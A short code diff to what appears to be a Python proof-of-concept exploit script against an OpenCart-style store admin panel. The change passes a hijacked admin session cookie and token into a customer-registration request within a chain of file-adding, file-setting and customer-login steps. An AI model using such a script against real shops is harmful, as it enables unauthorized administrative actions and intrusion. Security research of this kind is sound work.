@@ -68,7 +68,7 @@ def setfile(adcookies,adtoken):
 
 
    
-def register():
+def register(adcookies,adtoken):
     burp0_url = "https://"+host+":443/admin/index.php?route=customer/customer/add&user_token="+adtoken
     burp0_cookies = {"OCSESSID": adcookies}
     burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Origin": "https://"+host, "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryA1dWw4VKET5MLtqf", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36", "Sec-Fetch-Dest": "document", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Referer": "https://"+host+"/admin/index.php?route=customer/customer/add&user_token=JHKk0baTG54uMMIUeuxGHuU89yPtUcJg", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9"}
@@ -235,7 +235,7 @@ if __name__ == "__main__":
     addfile(adcookies,adtoken)
     n1=setfile(adcookies,adtoken)
     print("poc run ")
-    register()
+    register(adcookies,adtoken)
     cus_cookies=logincus()
     # addcart()
     # checkout()
